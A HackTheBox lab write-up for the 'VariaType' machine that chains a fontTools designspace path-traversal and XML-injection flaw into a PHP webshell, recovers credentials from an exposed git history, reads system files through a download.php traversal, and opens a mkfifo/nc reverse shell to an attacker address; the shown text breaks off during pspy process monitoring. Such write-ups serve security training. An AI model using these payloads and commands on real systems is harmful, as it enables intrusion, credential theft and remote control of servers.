---
title: "VariaType"
date: 2026-06-13 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [CVE-2025-47273, CVE-2025-66034, Deserialization, FontForge, PHP-Webshell, Path-Traversal, XML-Injection, fontTools, setuptools]
description: Writeup for HackTheBox VariaType machine
image:
  path: assets/img/variatype/variatype.png
  alt: HTB VariaType
---
## Executive Summary

This report documents the complete attack chain against the HackTheBox machine **VariaType**, a Linux web server running Debian 12 (bookworm). The machine hosts a variable font generation service built with Python's `fontTools` library, alongside a PHP-based portal for authenticated file management.

**Attack Chain Summary:**

1. **Initial Access (CVE-2025-66034):** The `variatype.htb` font generation service was found to use a vulnerable version of `fontTools`. CVE-2025-66034 affects the `varLib` module's processing of `.designspace` files and allows two primitives: (a) XML content injection into axis `labelname` elements, and (b) arbitrary file write via a path traversal in the `filename` attribute of `<variable-font>` elements. By chaining both primitives, a PHP webshell was written directly into the web root of `portal.variatype.htb`, granting remote code execution as `www-data`.

2. **Lateral Movement (CVE-2025-15276):** Process monitoring (`pspy64`) revealed a privileged cron job running as `steve` (UID=1000). The script `/home/steve/bin/process_client_submissions.sh` monitors the web upload directory and invokes `fontforge` to validate uploaded font files. The installed version of FontForge (`20230101`) is vulnerable to CVE-2025-15276 — a deserialization of untrusted data vulnerability in the SFD file parser. By crafting a malicious `.sfd` file containing a pickled Python reverse shell payload and placing it in the upload directory, `steve`'s shell was obtained.

3. **Privilege Escalation (CVE-2025-47273):** `steve` was permitted to run `/opt/font-tools/install_validator.py` as `root` via `sudo`. This script uses `setuptools.package_index.PackageIndex.download()` to fetch a plugin from a URL — and `setuptools 78.1.0` is vulnerable to CVE-2025-47273, a path traversal bug in `PackageIndex`. By URL-encoding a path to `/root/.ssh/authorized_keys` as the filename portion of the URL, and serving the attacker's SSH public key from a custom HTTP server, the key was written to root's authorized keys file, enabling passwordless SSH login as root.

**Impact:** Complete system compromise. Root access to the server, all credentials, and all hosted data.

---

## Reconnaissance — Nmap Scan

A two-phase Nmap scan was performed: a fast full-port TCP scan to identify open ports, followed by a targeted service/version fingerprinting scan on those ports.

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

Nmap scan report for 10.129.198.73
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Findings:**

| Port | Service | Notes |
|------|---------|-------|
| `22/tcp` | OpenSSH 9.2p1 | The SSH version `OpenSSH 9.2p1 Debian 2+deb12u7` precisely identifies the OS as **Debian 12.7 (bookworm)**. |
| `80/tcp` | nginx 1.22.1 | HTTP redirects to `http://variatype.htb/` — a virtual host is configured. |


The Nmap HTTP probe follows the redirect and discloses the hostname `variatype.htb`. This hostname must be added to `/etc/hosts` before the web application is accessible.

The hostname was registered locally:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ echo "$ip  variatype.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration — variatype.htb

The web application is a **variable font generator** — a tool that takes font source files and a `.designspace` specification and produces a single variable font file.

<img src="assets/img/variatype/web_home.png" alt="error loading tools">

The upload form accepts two types of inputs:

<img src="assets/img/variatype/web_upload.png" alt="error loading image">

- One or more `.ttf` or `.otf` font source files (the font masters).
- A `.designspace` XML configuration file that describes how to interpolate between those masters.

### What is a Variable Font?

Traditional (static) fonts ship as separate files for each style variant:

```
Arial-Light.ttf
Arial-Regular.ttf
Arial-Bold.ttf
Arial-Black.ttf
```

A **variable font** consolidates all of these into a single file that encodes the two design extremes (e.g., Light and Bold) and allows the rendering engine to mathematically interpolate any weight in between:

```
Light <------------- slider -------------> Bold
 300    400    500    700
  |      |      |      |
Thin   Normal  Med   Thick
```

The `.designspace` XML format is the Open Type standard for describing these relationships between font masters — it defines the design space axes (e.g., weight), maps source files to axis positions, and optionally names instances.

**Back-end technology disclosure:** The site documentation states it uses [fontTools](https://github.com/fonttools/fonttools) to generate variable fonts — specifically the `varLib` module.

### Testing Site Functionality

Dummy font sources were created using FontForge's Python scripting API to verify the site works end-to-end before exploiting it:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$  fontforge -script - << 'EOF'
import fontforge

# Create Light font
f = fontforge.font()
f.fontname = "MyFont-Light"
f.familyname = "MyFont"
f.fullname = "MyFont Light"
f.weight = "Light"

# Create glyph A
g = f.createChar(65, "A")
pen = g.glyphPen()
pen.moveTo((100, 0))
pen.lineTo((300, 700))
pen.lineTo((500, 0))
pen.endPath()
g.width = 600

f.generate("MyFont-Light.ttf")
print("Saved MyFont-Light.ttf")

# Create Bold font
f2 = fontforge.font()
f2.fontname = "MyFont-Bold"
f2.familyname = "MyFont"
f2.fullname = "MyFont Bold"
f2.weight = "Bold"

g2 = f2.createChar(65, "A")
pen2 = g2.glyphPen()
pen2.moveTo((80, 0))
pen2.lineTo((300, 700))
pen2.lineTo((520, 0))
pen2.endPath()
g2.width = 600

f2.generate("MyFont-Bold.ttf")
print("Saved MyFont-Bold.ttf")
EOF

Copyright (c) 2000-2026. See AUTHORS for Contributors.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 with many parts BSD <http://fontforge.org/license.html>. Please read LICENSE.
 Version: 20230101
 Based on sources from 2026-04-23 21:25 UTC-ML-D-GDK3.
PythonUI_Init()
copyUIMethodsToBaseTable()
Program root: /usr
Saved MyFont-Light.ttf
Saved MyFont-Bold.ttf                    
```

The accompanying `.designspace` file was created:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ cat > MyFont.designspace << 'EOF'
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="4.1">
  <axes>
    <axis tag="wght" name="Weight" minimum="300" default="300" maximum="700"/>
  </axes>
  <sources>
    <source filename="MyFont-Light.ttf" familyname="MyFont" stylename="Light">
      <location><dimension name="Weight" xvalue="300"/></location>
    </source>
    <source filename="MyFont-Bold.ttf" familyname="MyFont" stylename="Bold">
      <location><dimension name="Weight" xvalue="700"/></location>
    </source>
  </sources>
</designspace>
EOF
```

After uploading all three files, the site successfully generated a variable font:

<img src="assets/img/variatype/download_font.png" alt="error loading image">

This confirms the site is actively invoking `fontTools.varLib` on uploaded designspace files — the core component vulnerable to CVE-2025-66034.

---

## CVE-2025-66034 — fontTools varLib Arbitrary File Write + XML Injection (RCE)

### Technical Deep Dive — CVE-2025-66034

**Affected Versions:** fontTools `4.33.0` to `4.60.1`  
**Fixed in:** fontTools `4.60.2`  
**Reference:** [GHSA-768j-98cg-p3fv](https://github.com/advisories/GHSA-768j-98cg-p3fv)

CVE-2025-66034 is a two-primitive vulnerability in `fontTools.varLib` (also invoked by `python3 -m fontTools.varLib`) when processing untrusted `.designspace` files. Both primitives combine to achieve Remote Code Execution:

#### Primitive 1 — XML Content Injection via `<labelname>` CDATA

The `.designspace` format permits named labels for axis values using `<labelname xml:lang="...">` elements. The `varLib` parser reads these label values and embeds them into the generated output font file (specifically into the `STAT` table's axis value records, stored as name table strings).

The vulnerability is that `varLib` does not sanitize the content of these elements. An attacker can embed a **CDATA section** inside the `<labelname>` to inject arbitrary raw text — including PHP code — which is then written verbatim into the output file:

```xml
<labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
```

The trick with the nested CDATA sections (`]]]]><![CDATA[>`) is to properly close the CDATA and inject the `>` that would otherwise terminate it, keeping the XML well-formed while ensuring the PHP code ends up in the font output without being stripped.

#### Primitive 2 — Arbitrary File Write via `filename` Path Traversal

The `<variable-fonts>` section of a designspace file specifies where the generated font should be saved:

```xml
<variable-fonts>
  <variable-font name="MyFont" filename="output.ttf">
```

The vulnerable code in `fontTools.varLib` constructs the output path using `os.path.join(output_dir, filename)` **without validating** whether `filename` contains path traversal sequences or absolute paths. An attacker can supply:

```xml
<variable-font name="MaliciousFont" filename="../../../../../../../var/www/portal.variatype.htb/public/shell.php">
```

When `fontTools.varLib.main()` processes this file, it writes the generated "font" (which contains the injected PHP payload from Primitive 1) directly to the specified path — in this case, the PHP application's web root — creating a fully functional web shell.

### Proof of Concept — Local Verification

The vulnerability was first verified locally to confirm the version and exploit primitives work as expected.

A Python virtual environment with the vulnerable fontTools version was set up:

```python
python3 -m venv venv_exploit 

source venv_exploit/bin/activate 

pip install fonttools==4.59.0
```

```python
┌──(venv_exploit)─(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ python3 -c "import fontTools; print(fontTools.version)"
4.59.0

┌──(venv_exploit)─(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ fonttools varLib malicious2.designspace -o malicious_file
WARNING: Cannot look up family name, assign the 'familyname' attribute to the default source.
Axes:
[{'axisLabels': [],
  'axisOrdering': None,
  'default': 400.0,
  'hidden': False,
  'labelNames': {'en': '<?php echo shell_exec("/usr/bin/touch '
                       '/tmp/MEOW123");?>]]>',
                 'fr': 'MEOW2'},
  ...
Saving variation font malicious_file

┌──(venv_exploit)─(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ php malicious_file                                     
[binary font data containing injected PHP code]
...
TestWeight400]]>ThinMEOW2TestWeight400<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]>ThinMEOW2
...
┌──(venv_exploit)─(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ ls -la /tmp/MEOW123 
-rw-rw-r-- 1 kali kali 0 Jun 14 20:00 /tmp/MEOW123
```

The PHP code was injected into the font file and executed when PHP processed the file. The touch command was successfully executed, confirming RCE.

---

## Subdomain Enumeration — portal.variatype.htb

Virtual host (vhost) enumeration was performed using Gobuster against the known hostname `variatype.htb`:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ gobuster vhost -u http://variatype.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 --ad
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://variatype.htb/
[+] Method:                    GET
[+] Threads:                   50
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
portal.variatype.htb Status: 200 [Size: 2494]
#www.variatype.htb Status: 400 [Size: 157]
#mail.variatype.htb Status: 400 [Size: 157]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
```

A second virtual host `portal.variatype.htb` was discovered and added to `/etc/hosts`:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ echo "$ip  portal.variatype.htb" | sudo tee -a /etc/hosts
```

`http://portal.variatype.htb` presents a login page:

<img src="assets/img/variatype/web_portal.png" alt="error loading site">

---

## Exposed Git Repository — Credential Discovery

Directory and file bruteforcing was performed on the portal subdomain using `dirsearch`:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ dirsearch -u http://portal.variatype.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
                                                                                                                                                  
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Linux/VariaType/reports/http_portal.variatype.htb/__26-06-14_21-20-33.txt

Target: http://portal.variatype.htb/

[21:20:33] Starting:                                                                                                                             
[21:20:42] 301 -  169B  - /.git  ->  http://portal.variatype.htb/.git/      
[21:20:42] 403 -  555B  - /.git/                                            
[21:20:42] 200 -  143B  - /.git/config                                      
[21:20:42] 200 -   73B  - /.git/description
[21:20:42] 200 -   23B  - /.git/HEAD                                        
[21:20:42] 200 -   39B  - /.git/COMMIT_EDITMSG
[21:20:42] 403 -  555B  - /.git/branches/                                    
[21:20:42] 403 -  555B  - /.git/hooks/                                      
[21:20:42] 200 -  137B  - /.git/index                                       
[21:20:42] 200 -  700B  - /.git/logs/HEAD                                   
[21:20:42] 200 -  700B  - /.git/logs/refs/heads/master
[21:20:42] 200 -   41B  - /.git/refs/heads/master                           
[21:21:21] 200 -    0B  - /auth.php                                         
[21:21:35] 302 -    0B  - /dashboard.php  ->  /                             
[21:21:39] 302 -    0B  - /download.php  ->  /                              
[21:21:44] 301 -  169B  - /files  ->  http://portal.variatype.htb/files/    
[21:21:44] 403 -  555B  - /files/                                           
[21:22:39] 302 -    0B  - /view.php  ->  /               
```


**Important:** The `.git/` directory is publicly accessible! While the directory listing is forbidden (`403`), individual objects within it — including `config`, `HEAD`, `COMMIT_EDITMSG`, `logs/`, `refs/` and all git object files — are readable via HTTP. This allows reconstruction of the entire repository's contents using a tool like `git-dumper`.

### Dumping the Repository

`git-dumper` reconstructs a git repository from an exposed `.git/` directory by fetching each file individually based on the git object graph:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ git-dumper http://portal.variatype.htb/ git_dump
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://portal.variatype.htb/.git/config [200]
[-] Fetching http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/master [200]
[-] Finding objects
[-] Fetching objects
[-] Fetching http://portal.variatype.htb/.git/objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/50/30e791b764cb2a50fcb3e2279fea9737444870 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/6f/021da6be7086f2595befaa025a83d1de99478b [200]
[-] Fetching http://portal.variatype.htb/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d [200]
[-] Fetching http://portal.variatype.htb/.git/objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf [200]
[-] Fetching http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 [200]
[-] Running git checkout .
```

The dumped repository contained `auth.php` (the portal's authentication code) — but the current HEAD version had the credentials array cleared:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ ls -la git_dump     
total 16
drwxrwxr-x  3 kali kali 4096 Jun 14 21:48 .
drwxrwxr-x 11 kali kali 4096 Jun 14 21:48 ..
-rw-rw-r--  1 kali kali   36 Jun 14 21:48 auth.php
drwxrwxr-x  7 kali kali 4096 Jun 14 21:48 .git

┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ cat git_dump/auth.php            
<?php
session_start();
$USERS = [];
```

### Credentials in Commit History

Git permanently stores every version of every file in its object database. Even though the credentials were removed from the current HEAD, they remain accessible in the commit history. Each commit in the log was inspected using `git show`:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/git_dump]
└─$ git log          
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/git_dump]
└─$ git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

**Credentials found:** `gitbot` / `G1tB0t_Acc3ss_2025!`

The commit message `"fix: add gitbot user for automated validation pipeline"` reveals this account was likely created for a CI/CD bot — developers often commit automation credentials directly in source code as a shortcut, which is a classic sensitive data exposure.

Logging in with these credentials to `http://portal.variatype.htb` displays the dashboard which lists the variable font files generated by `http://variatype.htb/`

<img src="assets/img/variatype/portal_dashboard.png" alt="error loading image">

---

## Path Traversal — download.php

The portal's dashboard presents a file browser. Inspecting requests shows that both `/view.php` and `/download.php` accept a `f` parameter specifying the filename to display/download:

```
http://portal.variatype.htb/view.php?f=variabype_NIuYYGAIL9w.ttf
```

<img src="assets/img/variatype/portal_view.png" alt="error loading image">

Testing `/view.php` with path traversal payloads showed it was not vulnerable. However, `/download.php` was:

<img src="assets/img/variatype/download_request.png" alt="error loading image">

The `....//....//` double-encoded path traversal technique works by exploiting a single-pass sanitisation filter. If the server strips `../` sequences once, `....//` becomes `../` after one pass — bypassing the check. The payload chains enough traversal sequences to reach the filesystem root:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ curl -H 'Cookie: PHPSESSID=7d0r6gcpvj6epb8vcmbmu521lr' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
variatype:x:102:110::/nonexistent:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false             
```

Key intelligence from `/etc/passwd`:
- **`steve:x:1000:1000`** — A regular user with a home directory at `/home/steve` and an interactive bash shell. This is the primary non-root user account.
- **`variatype:x:102:110`** — A service account with no login shell (`/nonexistent` home), likely running the Python font generation service.

### Reading Nginx Configuration Files

The path traversal was used to leak the Nginx configuration, which reveals the web root — the crucial piece of information needed to target the CVE-2025-66034 file write:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ curl -s -H 'Cookie: PHPSESSID=7d0r6gcpvj6epb8vcmbmu521lr' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/nginx/nginx.conf' | grep -Ev '#|^$'
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/variatype.htb;
        include /etc/nginx/sites-enabled/portal.variatype.htb;
}
```

The main `nginx.conf` includes two virtual host configuration files. These were read in turn:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ curl -s -H 'Cookie: PHPSESSID=7d0r6gcpvj6epb8vcmbmu521lr' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/nginx/sites-enabled/variatype.htb' | grep -Ev '#|^$'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _; 
    return 301 http://variatype.htb$request_uri;
}
server {
    listen 80;
    server_name variatype.htb;
    access_log /var/log/nginx/variatype_access.log;
    error_log /var/log/nginx/variatype_error.log;
    location / {
        proxy_pass http://127.0.0.1:5000;
        ...
    }
}
```

Reading virtual host `/etc/nginx/sites-enabled/portal.variatype.htb` config file

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType]
└─$ curl -s -H 'Cookie: PHPSESSID=7d0r6gcpvj6epb8vcmbmu521lr' 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/nginx/sites-enabled/portal.variatype.htb' | grep -Ev '#|^$'
server {
    listen 80;
    server_name portal.variatype.htb;
    root /var/www/portal.variatype.htb/public;
    index index.php;
    access_log /var/log/nginx/portal_access.log;
    error_log /var/log/nginx/portal_error.log;
    location / {
        try_files $uri $uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
    location /files/ {
        autoindex off;
    }
}
```

**Key findings from Nginx config:**
- `variatype.htb` is a **reverse proxy** forwarding traffic to a local Python application on port `5000` — this is the `fontTools`-based font generator.
- `portal.variatype.htb` has its web root at **`/var/www/portal.variatype.htb/public`** — this is where the webshell must be written to become web-accessible.
- PHP files are processed via `php-fpm`, meaning a `.php` file placed in the web root will be executed by the PHP interpreter.

---

## Initial Foothold — Deploying the Webshell via CVE-2025-66034

With the web root confirmed, the full CVE-2025-66034 exploit was assembled.

### Font Generator Script (create_fonts.py)

The exploit requires valid `.ttf` source font files to upload alongside the malicious `.designspace`. This Python script uses the `fontTools.fontBuilder` API to programmatically create two minimal but valid TrueType fonts — a "Light" weight (100) and a "Regular" weight (400):

```python
#!/usr/bin/env python3
import os

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    # FontBuilder: high-level API for constructing fonts from scratch
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    
    # All fonts must have a .notdef glyph (the "missing glyph" placeholder)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})  # Empty cmap: no Unicode code point mappings
    
    # Draw a simple rectangle as the .notdef glyph using a TTGlyphPen
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()
    
    # Install the glyph with its horizontal metrics (advance width, left side bearing)
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    
    # Required font tables
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)   # OS/2.usWeightClass: e.g. 100=Thin, 400=Regular
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    
    fb.save(filename)

if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    create_source_font("source-light.ttf", weight=100)    # Light master
    create_source_font("source-regular.ttf", weight=400)  # Regular master
```

**Script breakdown:**
- `FontBuilder(unitsPerEm=1000, isTTF=True)` — Creates a TrueType font with 1000 units per em (the standard UPM for modern fonts).
- `setupGlyphOrder([".notdef"])` — Every valid font must have a `.notdef` glyph as the first entry; it is shown when a character has no mapping.
- `TTGlyphPen` — A pen-style drawing API that accepts path commands (`moveTo`, `lineTo`, `closePath`) and converts them into the TrueType binary glyph format (`glyf` table).
- `setupOS2(usWeightClass=weight)` — The `OS/2` table's `usWeightClass` is the standard field that specifies the font's weight. `fontTools.varLib` reads this from source fonts to understand their position on the design axis.
- `fb.save(filename)` — Writes all required font tables into a valid TrueType binary file.

### Malicious designspace File (exploit.designspace)

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <!-- XML injection via CDATA: injects PHP webshell into the output font file -->
      <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <!-- Path traversal: writes output to the portal's PHP web root instead of a font file -->
    <variable-font name="MaliciousFont" filename="../../../../../../../var/www/portal.variatype.htb/public/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

**Key elements explained:**
- The `<labelname xml:lang="en">` CDATA injection places `<?php system($_GET['cmd']); ?>` verbatim into the font file's `name` table string. When PHP processes the resulting file, it executes this code.
- The nested CDATA trick `]]]]><![CDATA[>` is required because a CDATA section is terminated by `]]>`. By splitting it as `]]]]><![CDATA[>`, the XML remains syntactically valid while the payload text flows uninterrupted into the output.
- The `filename` attribute in `<variable-font>` contains seven `../` sequences to traverse from the application's upload directory up to the filesystem root, then descends into the portal web root.

Upload `exploit.designspace`, `source-light.ttf`, and `source-regular.ttf` to the `variatype.htb` font generator. To confirm the webshell was created, visit `http://portal.variatype.htb/dashboard.php`.

<img src="assets/img/variatype/exploit_uploaded.png" alt="error loading image">

### Reverse Shell from the Webshell

The webshell was verified and used to trigger a reverse shell:

```
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/temp]
└─$ curl -s -H 'Cookie: PHPSESSID=7d0r6gcpvj6epb8vcmbmu521lr' 'http://portal.variatype.htb/shell.php?cmd=id' | strings | grep uid
TestWeight400uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `uid=33(www-data)` confirms code execution under the PHP/Nginx web process. A mkfifo-based bash reverse shell was URL-encoded and sent:

```shell
# Reverse shell payload:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.176 4444 >/tmp/f
```

base64 encode the payload and execute it

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/temp]
└─$ curl -sg -H 'Cookie: PHPSESSID=7d0r6gcpvj6epb8vcmbmu521lr' 'http://portal.variatype.htb/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20%2Di%202%3E%261%7Cnc%2010%2E10%2E15%2E176%204444%20%3E%2Ftmp%2Ff'
```

Recieved shell at listener

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/temp]
└─$ ncat -lvnp 4444
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.26.31:34622.
bash: cannot set terminal process group (3384): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Stabilising the Shell

The raw `bash` reverse shell has no TTY, which prevents interactive commands and job control. The following technique upgrades it to a fully interactive pseudo-terminal (PTY):

```shell
www-data@variatype:~/portal.variatype.htb/public$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@variatype:~/portal.variatype.htb/public$ ^Z
zsh: suspended  ncat -lvnp 4444
                                                                                                                                                 
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/temp]
└─$ stty -echo raw; fg                                          
[1]  + continued  ncat -lvnp 4444
                                 reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@variatype:~/portal.variatype.htb/public$ export TERM=xterm
```

Terminal dimensions were matched to prevent display issues:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/VariaType/temp]
└─$ stty -a | head -n 1
speed 38400 baud; rows 37; columns 145; line = 0;

www-data@variatype:~/portal.variatype.htb/public$ stty rows 37 cols 145
```

---

## Lateral Movement — steve (CVE-2025-15276 — FontForge SFD Deserialization RCE)

### Process Discovery with pspy64

`pspy64` is a process monitor that watches the Linux `/proc` filesystem for new process spawns without requiring root. It was uploaded and run to identify privileged background jobs:

```shell
www-data@variatype:/tmp$ wget http://10.10.15.176/pspy64
www-data@variatype:/tmp$ chmod +x pspy64 
www-data@variatype:/tmp$ ./pspy64 
...
2026/06/14 14:30:01 CMD: UID=1000  PID=37718  | timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c 
import fontforge                                                                                                                                 
import sys                                                                                                                                       
try:                                                                                                                                             
    font = fontforge.open('variabype_87uFFwU4fmY.ttf')                                                                                           
